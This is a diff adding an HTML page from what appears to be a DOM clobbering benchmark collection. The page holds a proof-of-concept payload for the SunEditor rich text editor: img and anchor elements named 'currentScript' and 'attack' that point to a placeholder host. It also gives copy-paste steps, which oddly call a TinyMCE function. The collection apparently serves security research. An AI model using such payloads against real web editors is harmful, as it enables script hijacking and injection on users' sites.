@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - sun-editor</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;img name=&quot;attack&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;a name=&quot;attack&quot; href=&quot;https://xxx.xxx.xxx&quot;&gt;AAA&lt;/a&gt;
+&lt;p&gt;Copy &amp; Paste the following rendered HTML elements to the editor and Run the following code: tinymce.activeEditor.getContent(&quot;default&quot;);&lt;/p&gt;</pre>
+  <img name="currentScript" src="https://xxx.xxx.xxx">
+<img name="attack" src="https://xxx.xxx.xxx">
+<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
+<p>Copy & Paste the following rendered HTML elements to the editor and Run the following code: tinymce.activeEditor.getContent("default");</p>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;link href=&quot;https://cdn.jsdelivr.net/npm/suneditor@latest/dist/css/suneditor.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;!-- &lt;link href=&quot;https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor.css&quot; rel=&quot;stylesheet&quot;&gt; --&gt;
+&lt;!-- &lt;link href=&quot;https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor-contents.css&quot; rel=&quot;stylesheet&quot;&gt; --&gt;
+&lt;script src=&quot;https://cdn.jsdelivr.net/npm/suneditor@latest/dist/suneditor.min.js&quot;&gt;&lt;/script&gt;
+&lt;!-- languages (Basic Language: English/en) --&gt;
+&lt;script src=&quot;https://cdn.jsdelivr.net/npm/suneditor@latest/src/lang/ko.js&quot;&gt;&lt;/script&gt;
+
+&lt;textarea id=&quot;sample&quot;&gt;Hi&lt;/textarea&gt;
+const editor = SUNEDITOR.create((document.getElementById(&#x27;sample&#x27;) || &#x27;sample&#x27;),{
+    // All of the plugins are loaded in the &quot;window.SUNEDITOR&quot; object in dist/suneditor.min.js file
+    // Insert options
+    // Language global object (default: en)
+    lang: SUNEDITOR_LANG[&#x27;ko&#x27;]
+});</pre>
+  <link href="https://cdn.jsdelivr.net/npm/suneditor@latest/dist/css/suneditor.min.css" rel="stylesheet">
+<!-- <link href="https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor.css" rel="stylesheet"> -->
+<!-- <link href="https://cdn.jsdelivr.net/npm/suneditor@latest/assets/css/suneditor-contents.css" rel="stylesheet"> -->
+<script src="https://cdn.jsdelivr.net/npm/suneditor@latest/dist/suneditor.min.js"></script>
+<!-- languages (Basic Language: English/en) -->
+<script src="https://cdn.jsdelivr.net/npm/suneditor@latest/src/lang/ko.js"></script>
+
+<textarea id="sample">Hi</textarea>
+const editor = SUNEDITOR.create((document.getElementById('sample') || 'sample'),{
+    // All of the plugins are loaded in the "window.SUNEDITOR" object in dist/suneditor.min.js file
+    // Insert options
+    // Language global object (default: en)
+    lang: SUNEDITOR_LANG['ko']
+});
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../tinymce/poc.html">Next: tinymce</a>
+  </div>
+</section>
+
+</body>
+</html>
